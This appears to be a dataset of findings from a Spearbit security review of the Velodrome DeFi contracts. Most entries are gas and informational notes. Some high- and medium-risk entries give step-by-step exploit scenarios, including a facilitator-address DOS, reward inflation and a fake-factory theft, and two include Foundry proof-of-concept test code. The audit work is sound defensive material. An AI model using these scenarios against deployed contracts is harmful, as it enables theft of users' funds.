[{"title": "isApproved function optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because settings are all known, you could do an if-check in memory rather than in storage, by validating first the fallback settings. The recommended implementation will become cheaper for the base case, negligibly more expensive in other cases ~10s of gas", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Use calldata instead of memory to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Using calldata avoids copying the value into memory, reducing gas cost", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Cache store variables when used multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Storage loads are very expensive compared to memory loads, storage values that are read multiple times should be cached avoiding multiple storage loads. In SinkManager contract use multiple times the storage variable ownedTokenId", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Add immutable to variable that don't change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Using immutable for variables that do not changes helps to save on gas used. The reason has been that immutable variables do not occupy a storage slot when compiled, they are saved inside the contract byte code.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Use Custom Errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "As one can see here: \"there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\"", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Cache array length outside of loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Withdrawing from a managed veNFT locks the user's veNFT for the maximum amount of time", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "A user may deposit their veNFT through the depositManaged() function with any unlock time value. However, upon withdrawing, the unlock time is automatically configured to (block.timestamp + MAXTIME / WEEK) * WEEK. This is poor UX and it does not give users much control over the expiry time of their veNFT.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "veNFT split functionality can not be disabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Once split functionality has been enabled via the enableSplitForAll(), it is not possible to disable this feature in the future. It does not pose any additional risk to have it disabled once users have already split their veNFTs because the protocol allows for these locked amounts to be readily withdrawn upon expiry.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Anyone can notify the FeesVotingReward contract of new rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "While the BribeVotingReward contract intends to allow bribes from anyone, the FeesVotingReward contract is designed to receive fees from just the Gauge contract. This is inconsistent with other reward contracts like LockedManagedReward.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Missing check in merge if the _to NFT has voted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The merge() function is used to combine a _from VeNFT into a _to veNFT. It starts with a check on if the _from VeNFT has voted or not. However, it doesn't check if the _to VeNFT has voted or not. This will cause the user to have less voting power, leaving rewards and/or emissions on the table, if they don't call poke() || reset(). Although this would only be an issue for an unaware user. An aware user would still have to waste gas on either of the following: 1. An extra call to poke() || reset(). 2. Vote with the _to veNFT and then call merge().", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Ratio of invariant _k to totalSupply of the AMM pool may temporarily decrease", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The burn function directly sends the reserve pro-rated to the liquidity token. This is a simple and elegant way. Nevertheless, two special features of the current AMM would lead to a weird situation. 1. The fee of the AMM pool is sent to the fee contract instead of being absorbed into the pool; 2. The stable pool's curve x3y + y3x have a larger rounding error compare to uni-v2's constant product formula. The invariant K in a stable pool can decrease temporarily when a user performs certain actions like minting a token, doing a swap, and withdrawing liquidity. This means that the ratio of K to the total supply of the pool is not monotonously increasing. In most cases, this temporary decrease is negligible and the ratio of K to the total supply of the pool will eventually increase again. However, the ratio of K to the total supply is an important metric for calculating the value of LP tokens, which are used in many protocols. If these protocols are not aware of the temporary decrease in the K value, they may suffer from serious issues (e.g. overflow). The root cause of this issue is: there are always rounding errors when using \"balance\" to calculate invariant k. Sometimes, the rounding error is larger. if an lp is minted when the rounding error is small (ratio of amount: k is small) and withdrawn when the rounding error is large (ratio of amount: k is large). The total invariant decreased. We can find a counter-example where the invariant decrease. function testRoundingErrorAttack(uint swapAmount) public { // The counter-example: swapAmount = 52800410888861351333 vm.assume(swapAmount < 100_000_000 ether); vm.assume(swapAmount > 10 ether); uint reserveA = 10 ether; uint reserveB = 10 ether; uint initialK = _k(reserveA, reserveB); reserveA *= 2; reserveB *= 2; uint tempK = _k(reserveA, reserveB); reserveB -= _getAmountOut(swapAmount, token0, reserveA, reserveB); reserveA += swapAmount; vm.assume(tempK <= _k(reserveA, reserveB)); reserveA -= reserveA / 2; reserveB -= reserveB / 2; require(_k(reserveA, reserveB) > } initialK, \"Rounding error attack!\"); 47", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Inconsistent check for adding value to a lock", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "depositFor allows anyone to add value to an existing lock However increaseAmount, which for NORMAL locks is idempotent, has a check to only allow an approved or Owner to increase the amount.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Privileged actors are incentivized to front-run each other", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Privileged actors are incentivized to front-run each other and vote at the last second, because of the FIFS OP sequencer, managers will try to vote exactly at the penultimate block in order to maximize their options (voting can only be done once)", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "First nudge propose must happen one epoch before tail is set to true", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because you can only propose a nudge one epoch in advance, the first propose call will need to happen on the last epoch in which tail is set to false While the transaction simulation will fail for execute, the EpochGovernor.propose math will make it so that the first proposal will have to be initiated an epoch before in order for it to be executable on the first tail epoch", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Missing emit important events", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The contracts that change or create sensible information should emit an event.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Marginal rounding errors when using small values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It may be helpful to encourage end users to use BPS or higher denominations for weights when dealing with multiple gauges to keep precision high. Due to widespread usage of the _vote function throughout the codebase and in forks, it may be best to suggest this in documentation to avoid reverts", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Prefer to use nonReentrant on external functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "it may be best to use nonReentrant on the external functions rather than the internal ones. Vote, for example, is not protected because the internal function is.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Redundant variable update", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "In notifyRewardAmount the variable lastUpdateTime is updated twice", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Turn logic into internal function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "In Gauge contract the logic to update rewardPerTokenStored,lastUpdateTime,rewards,userRewardsPerTokenPaid can be converted to internal function for simplicity", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Add extra slippages on client-side when dependent paths are used in generateZapInParams", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "generateZapInParams is a helper function in Router that calculates the parameters for zapIn. there's a duplicate pair in RoutesA and RoutesB, the value calculated here would be off. For example, The optimal path to swap dai into usdc/velo pair would likely have dai/eth in both routesA and routesB. When the user uses this param to call zapIn, it executes two swaps: dai -> eth -> usdc, and dai -> eth -> velo. As the price of dai/eth is changed after the first swap, the second swap would have a slightly bad price. The zapIn will likely revert as it does not meet the min token return. If", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Unnecessary skim in router", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The pair contract absorbs any extra tokens after swap, mint, and burn. Triggering Skim after burn/mint would not return extra tokens.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Overflow is not desired and can lead to loss of funds in Solidity 8.0.0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "In solidity 8.0, overflow of uint is defaulted to be reverted. //Pair.sol#L235-L239 uint256 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) { reserve0CumulativeLast += _reserve0 * timeElapsed; reserve1CumulativeLast += _reserve1 * timeElapsed; } reserve0CumulativeLast += _reserve0 * timeElapsed; This calculation will overflow and DOS the pair if _- reserve0 is too large. As a result, the pool should not support high decimals tokens.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Unnecessary casting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "_totalWeight is already declared as uint256", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Refactor retrieve current epoch into library", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Could refactor to a library function to retrieve the current epoch", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Add governor permission to sensible functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Some functions that change important variables could add governor permission to enable changes. The function setManagedState in VotingEscrow is one that is recommended to add governor permission.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Admin privilege through proposal threshold", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "As an Admin Privilege of the Team, the variable proposalNumerator could change causing the proposalThreshold to be higher than expected. The Team could front-run calls to propose and increase the numerator, this could block proposals", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Simplify check for rounding error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The check of rounding error can be simplified. Instead using A / B > 0 use A > B", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Storage declarations in the middle of the file", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "If you wish to keep the logic separate, consider creating a separate abstract contract.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Inconsistent usage of _msgSender()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "There are some instances where msg.sender is used in contrast with _msgSender() function.", "labels": ["Spearbit", "Velodrome", "Severity: Informational Voter.sol#L75-L78,"]}, {"title": "Change emergency council should be enabled to Governor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Governor may also want to be able to set and change the emergency council, this avoids the potential risk of the council abusing their power", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Unnecessary inheritance in Velo contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Velo isn't used for governance, therefore it's not necessary to inherit from ERC20Votes.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Incorrect value in Mint event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "In Minter#update_period the Mint event is emitted with incorrect values.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Do not cache constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It is not necessary to cache constant variable.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "First week will have no emissions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Cannot call update_period on the first week due to setting the current period to this one. Emissions will start at most one week after", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Variables can be renamed for better clarity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "For a better understanding, some variables could be renamed.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Minter week will eventually shift", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The constant WEEK is used as the duration of an epoch that resets every Thursday, after 4 years (4 * 365.25 days) the day of the week will eventually shift, not following the Thursday cadence.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Ownership change will break certain yield farming automations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Due to the check, any transfer done in the same block as the call to depositManaged will revert. While a sidestep for the mechanic for malicious users was shown, the check will prevent a common use case in Yield Farming: Zapping. Because of the check, an end user will not be able to zap from their VELO to VE to the Managed Position, which may create a sub-par experience for end users. This should also create worse UX for Yield Farming Projects as they will have to separate the transfer from the deposit which will cost them more gas and may make their product less capital efficient", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Quantitative analysis of Minter logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It will take 110 iterations to go from 15 MLN to the Tail Emission Threshold Minter.sol#L32-L37 /// @notice When emissions fall below this amount, begin tail emissions uint256 public constant TAIL_START = 5_000_000 * 1e18; /// @notice Tail emissions rate in basis points uint256 public tailEmissionRate = 30; /// @notice Starting weekly emission of 15M VELO (VELO has 18 decimals) uint256 public weekly = 15_000_000 * 1e18; ## Python allows decimal Math, wlog, just take mantissa INITIAL = 15 * 10 ** 6 TAIL = 5 * 10 ** 6 MULTIPLIER_BPS = 99_00 MAX_BPS = 10_000 value = INITIAL i = 0 min_emitted = 0 while (value > TAIL): i+= 1 min_emitted += value value = value * MULTIPLIER_BPS / MAX_BPS i 110 value 4965496.324815211 min_emitted 1003450367.5184793 ## If nobody ever bridged, this would be emissions at tail min_emitted * 30 / 10_000 3010351.1025554384 Tail emissions are most likely going to be a discrete step down in emissions >>> min_emitted 1003450367.5184793 V1_CIRC = 150 * 10 ** 6 ranges = range(V1_CIRC // 10, V1_CIRC, V1_CIRC // 10) for val in ranges: print((min_emitted + val) * 30 / 10_000) 3055351.1025554384 3100351.1025554384 3145351.1025554384 3190351.1025554384 3235351.1025554384 3280351.1025554384 3325351.1025554384 3370351.1025554384 3415351.1025554384 The last value before the tail will be most likely around 1 Million fewer tokens minted per period. Maximum Mintable Value is slightly above Tail, with Absolute Max being way above Tail 57 ## Max Supply >>> 1000 * 10 ** 6 1000000000 >>> min_emitted = 1003450367.5184793 >>> max_circ = 1000 * 10 ** 6 + min_emitted >>> max_mint = max_circ * 30 / 10_000 ## If we assume min_emitted + 1 Billion Velo V1 Sinked >>> max_mint 6010351.102555438 ## If we assume nudge to 100 BPS >>> abs_max_mint = max_circ * 100 / 10_000 >>> abs_max_mint 20034503.675184794", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Optimism's block production may change in the future", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "block number, because of OP potentially changing block frequency in the future, given Bedrocks update to block.timestamp, it may be desirable to refactor back to the OZ implementation. And VeloGorvernor assumes 2 blocks every second. In OP's docs says block.number is not a reliable timing reference: community.optimism.io/docs/developers/build/differences/#block- numbers-and-timestamps It's also dangerous to use block.number at the time cause it will probably mean a different thing in pre- and post- bedrock upgrades.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Remove unnecessary check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "These checks are unnecessary because it already checks if targets and calldata lengths are equal to 1.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Event is missing indexed fields", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Missing checks for address(0) when assigning values to address state variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the proto- col.", "labels": ["Spearbit", "Velodrome", "Severity: Informational FactoryRegistry.sol#L26-L28, RewardsDistributor.sol#L308,"]}, {"title": "Incorrect comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "There are a few mistakes in the comments that can be corrected in the codebase.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Discrepancies between specification and implementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Instance 1 - Zapping The specification mentioned that it supports zapping into a pool from any token. Following is the extract  Swapping and lp depositing/withdrawing of fee-on-transfer tokens.  Zapping in and out of a pool from any token (i.e. A->(B,C) or (B,C) -> A). A can be the same as B or C.  Zapping and staking into a pool from any token. 60 However, the zapIn and zapOut functions utilize the internal _swap function that does not support fee-on-transfer tokens.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "Early exit for withdrawManaged function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "VotingEscrow.withdrawManaged function.", "labels": ["Spearbit", "Velodrome", "Severity: Informational"]}, {"title": "DOS attack at future facilitator contract and stop SinkManager.convertVe", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "As noted in \"DOS attack by delegating tokens at MAX_DELEGATES = 1024\", the old votingEscrow has a gas concern, i.e., the gas cost of transfer/ burn will increase when an address holds multiple NFT tokens. The concern becomes more serious when the protocol is deployed on Optimism, where the gas limit is smaller than other L2 chains. If an address is being attacked and holds max NFT tokens (1024), the user can not withdraw funds due to the gas limit. To mitigate the potential DOS attack where the attack DOS the v1's votingEscrow and stop sinkManager from re- ceiving tokens, the sinkManager utilize a facilitator contract. When the sinkManager needs to receive the votingE- scrow NFT, it creates a new contract specifically for this purpose. Since the contract is newly created, it does not contain any tokens, making it more gas-efficient to receive the token through the facilitator contract. However, the attacker can DOS attack the contract by sending NFT tokens to a future facilitator. salted-contract-creations-create2 When creating a contract, the address of the contract is computed from the address of the creating contract and a counter that is increased with each contract creation. The exploit scenario would be: At the time the sinkManager is deployed and zero facilitator is created. The attacker can calculate the address of all future facilitators by computing sha3(rlp.encode([normalize_address(sender), nonce]))[12:] The attacker can compute the 10-th facilitator's address and sends 1024 NFT tokens to the ad- dress. The sinkManager will function normally nine times. Though, when the 10th user wants to convert the token, the sinkManager deployed the 10th facilitator address. Since the 10th facilitator already has 1024 NFT positions, it can not receive any tokens. The transaction will revert and the sinkManager will be stuck in the current state.", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "RewardDistributor caching totalSupply leading to incorrect reward calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "RewardDistributor distributes newly minted VELO tokens to users who locks the tokens in VotingEscrow. Since the calculation of past supply is costly, the rewardDistributor cache the supply value in uint256[1000000000000000] public veSupply. The RewardDistributor._checkpointTotalSupply function would iterate from the last updated time util the latest epoch time, fetches totalSupply from votingEscrow, and store it. Assume the following scenario when a transaction is executed at the beginning of an epoch. 1. The totalSupply is X. 2. The user calls checkpointTotalSupply. The rewardDistributor save the totalSupply = X. 3. The user creates a lock with 2X the amount of tokens. The user has balance = 2X and the totalSupply becomes 3X. 4. Fast forward to when the reward is distributed. The user claims the tokens, reward is calculated by total reward * balance / supply and user gets 2x of the total rewards.", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "Lack of slippage control during compounding", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "When swapping the reward tokens to VELO tokens during compounding, the slippage control is disabled by configuring the amountOutMin to zero. This can potentially expose the swap/trade to sandwich attacks and MEV (Miner Extractable Value) attacks, resulting in a suboptimal amount of VELO tokens received from the swap/trade. router.swapExactTokensForTokens( balance, 0, // amountOutMin routes, address(this), block.timestamp );", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "ALLOWED_CALLER can steal all rewards from AutoCompounder using a fake factory in the route.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "AutoCompounder allows address with ALLOWED_CALLER role to trigger swapTokenToVELOAndCompound. The function sells the specified tokens to VELO. Since the Velo router supports multiple factories. An attacker can deploy a fake factory with a backdoor. By routing the swaps through the backdoor factory the attacker can steal all reward tokens in the AutoCompounder contract.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "depositManaged can be used by locks to receive unvested VELO rebase rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Velo offer rebase emissions to all Lockers. These are meant to be depositFor into an existing lock, and directly transferred if the lock just expired. The check is the following: if (_timestamp > _locked.end && !_locked.isPermanent) { By calling depositManaged we can get the check to pass for a Lock that is not expired, allowing us to receive Unvested Velo (we could sell unfairly for example). Due to how depositManaged and withdrawManaged work, the attacker would be able to perform this every other week (1 week cooldown, 1 week execution). Because of how the fact that managedRewards are delayed by a week the attacker will not lose any noticeable amount of rewards, meaning that most users would rationally opt-into performing this operation to gain an unfair advantage, or to sell their rewards each week while other Lockers are unable or unwilling to perform this operation. The following POC will show an increase in VELO balance for the tokenId2 owner in spite of the fact that the lock is not expired Logs: Epoch 1 Token Locked after Token2 Locked after User Bal after 56039811453980167852 -1000000000000000000000000 // Negative because we have `depositManaged` 56039811453980167852 // We received the token directly, unvested function testInstantClaimViaManaged() public { // Proof that if we depositManaged, we can get our rebase rewards instantly // Instead of having to vest them via the lock skipToNextEpoch(1 days); minter.updatePeriod(); console2.log(\"Epoch 1\"); VELO.approve(address(escrow), TOKEN_1M * 2); uint256 tokenId = escrow.createLock(TOKEN_1M, MAXTIME); uint256 tokenId2 = escrow.createLock(TOKEN_1M, MAXTIME); uint256 mTokenId = escrow.createManagedLockFor(address(this)); skipToNextEpoch(1 hours + 1); minter.updatePeriod(); 65 skipToNextEpoch(1 hours + 1); minter.updatePeriod(); // Now we claim for 1, showing that they incease locked int128 initialToken1 = escrow.locked(tokenId).amount; distributor.claim(tokenId); // Claimed from previous epoch console2.log(\"Token Locked after \", escrow.locked(tokenId).amount - initialToken1); // For 2, we deposit managed, then claim, showing we get tokens unlocked uint256 initialBal = VELO.balanceOf(address(this)); int128 initialToken2 = escrow.locked(tokenId2).amount; voter.depositManaged(tokenId2, mTokenId); distributor.claim(tokenId2); // Claimed from previous epoch console2.log(\"Token2 Locked after \", escrow.locked(tokenId2).amount - initialToken2); console2.log(\"User Bal after \", VELO.balanceOf(address(this)) - initialBal); }", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Unnecessary slippage loss due to AutoCompounder selling VELO", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "AutoCompounder allows every address to help claim the rewards and compound to the locked VELO position. The AutoCompounder will sell _tokensToSwap into VELO. By setting VELO as _tokensToSwap, the AutoCom- pounder would do unnecessary swaps that lead to unnecessary slippage loss.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "epochVoteStart function calls the wrong library method", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The epochVoteStart function calls the VelodromeTimeLibrary.epochStart function instead of the VelodromeTimeLibrary.epochVoteStart function. Thus, the Voter.epochVoteStart function returns a voting start time without factoring in the one-hour distribution window, which might cause issues for users and developers relying on this information.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Managed NFT can vote more than once per epoch under certain circumstances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The owner of the managed NFT could break the invariant that an NFT can only vote once per epoch Assume Bob owns the following two (2) managed NFTs:  Managed veNFT (called mNFTa) with one (1) locked NFT (called lNFTa)  Managed veNFT (called mNFTb) with one (1) locked NFT (called lNFTb)  The balance of lNFTa and lNFTb is the same Bob voted on poolx with mNFTa and mNFTb on the first hour of the epoch At the last two hours of the voting windows of the current epoch, Bob changed his mind and decided to vote on the pooly . Under normal circumstances, the onlyNewEpoch modifier will prevent mNFTa and mNFTb from triggering the Voter.vote function because these two veNFTs have already voted in the current epoch and their lastVoted is set to a timestamp within the current epoch. However, it is possible for Bob to bypass this control. Bob could call Voter.withdrawManaged function to withdraw lNFTa and lNFTb from mNFTa and mNFTb respectively. Since the weight becomes zero, the lastVoted for both mNFTa and mNFTb will be cleared. As a result, they will be allowed to re-vote in the current epoch. Bob will call Voter.depositManaged to deposit lNFTb into mNFTa and lNFTa into mNFTb respectively to increase the weight of the managed NFTs. Bob then calls Voter.vote with mNFTa and mNFTb to vote on pooly . Since the lastVoted is empty (cleared earlier), the onlyNewEpoch modifier will not revert the transaction. Understood that the team that without clearing the lastVoted, it would lead to another potential issue where a new managed NFT could potentially be made useless temporarily for an epoch. Given the managed NFT grant significant power to the owner, the team intended to restrict access to the managed NFTs and manage abuse by utilizing the emergency council/governor to deactivate non-compliant managed NFTs, thus mitigating the risks of this issue.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Invalid route is returned if token does not have a trading pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Assume that someone called the getOptimalTokenToVeloRoute function with a token called T that does not have a trading pool within Velodrome. While looping through all the ten (two) routes pre-defined in the constructor at Line 94 below, since the trading pool with T does not exist, it will keep skipping to the next route until the loop ends. As such, the index remains uninitialized at the end, meaning it holds the default value of zero. In Lines 110 to 112, it will conclude that the optimal route is as follows: routes[0] = routesTokenToVelo[index][0] = routesTokenToVelo[0][0] = address(0) <> USDC routes[1] = routesTokenToVelo[index][1] = routesTokenToVelo[0][1] = USDC <> VELO routes[0].from = token = T routes = T <> USDC <> VELO As a result, the getOptimalTokenToVeloRoute function returns an invalid route. function getOptimalTokenToVeloRoute( address token, uint256 amountIn ) external view returns (IRouter.Route[] memory) { // Get best route from multi-route paths uint256 index; uint256 optimalAmountOut; IRouter.Route[] memory routes = new IRouter.Route[](2); uint256[] memory amountsOut; // loop through multi-route paths for (uint256 i = 0; i < 10; i++) { routes[0] = routesTokenToVelo[i][0]; // Go to next route if a trading pool does not exist if (IPoolFactory(routes[0].factory).getPair(token, routes[0].to, routes[0].stable) == address(0)) continue; ,! routes[1] = routesTokenToVelo[i][1]; // Set the from token as storage does not have an address set routes[0].from = token; amountsOut = router.getAmountsOut(amountIn, routes); // amountOut is in the third index - 0 is amountIn and 1 is the first route output uint256 amountOut = amountsOut[2]; if (amountOut > optimalAmountOut) { // store the index and amount of the optimal amount out optimalAmountOut = amountOut; index = i; } } // use the optimal route determined from the loop routes[0] = routesTokenToVelo[index][0]; routes[1] = routesTokenToVelo[index][1]; routes[0].from = token; // Get amountOut from a direct route to VELO IRouter.Route[] memory route = new IRouter.Route[](1); 68 route[0] = IRouter.Route(token, velo, false, factory); amountsOut = router.getAmountsOut(amountIn, route); // compare output and return the best result return amountsOut[1] > optimalAmountOut ? route : routes; }", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "SafeApprove is not used in AutoCompounder", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "safeApprove is not used in AutoCompounder. 